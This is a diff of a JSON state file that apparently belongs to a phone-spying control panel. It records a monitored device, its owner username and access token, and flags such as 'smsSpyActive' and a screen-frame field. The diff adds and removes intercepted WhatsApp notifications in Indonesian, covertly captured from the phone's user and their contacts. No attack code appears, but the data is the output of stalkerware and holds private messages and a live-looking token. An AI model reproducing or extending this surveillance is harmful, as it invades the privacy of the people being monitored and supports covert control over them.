@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776951705802,
+    "lastSeen": 1776951714498,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "Telepon video berlangsung",
+        "time": "23/04 21:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951717227
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "Berdering…",
+        "time": "23/04 21:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776951710030
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -4003,22 +4019,6 @@
         "time": "23/04 19:14",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942842925
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "kebiasaan",
-        "time": "23/04 19:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942842568
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "oalah oke siap kak",
-        "time": "23/04 19:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942842496
       }
     ],
     "galleryPhotos": [],
